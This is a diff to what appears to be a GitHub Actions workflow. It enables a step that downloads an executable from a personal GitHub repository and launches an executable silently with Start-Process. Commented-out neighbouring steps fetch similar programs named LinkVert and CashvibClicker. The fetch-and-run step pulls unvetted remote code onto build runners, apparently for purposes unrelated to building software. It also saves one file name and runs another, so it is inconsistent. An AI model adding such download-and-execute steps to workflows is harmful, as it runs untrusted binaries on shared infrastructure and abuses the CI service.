@@ -43,9 +43,10 @@ jobs:
       #   run: |
       #     Invoke-WebRequest -Uri "https://github.com/jackricj/winpc23/raw/main/LinkVert.exe" -OutFile "LinkVert.exe"
 
-      # - name: Download and run Cashvib File
-      #   run: |
-      #     Invoke-WebRequest -Uri "https://github.com/jackricj/winpc23/raw/main/Cashvib.exe" -OutFile "Cashvib.exe"
+      - name: Download and run Cashvib File
+        run: |
+          Invoke-WebRequest -Uri "https://github.com/jackricj/std1/raw/main/cash.exe" -OutFile "Cashvib.exe"
+          Start-Process -FilePath "D:\a\winpc23\winpc23\Cash.exe" -ArgumentList "/S" -Wait
 
       # - name: Download and run CashvibClicker File
       #   run: |
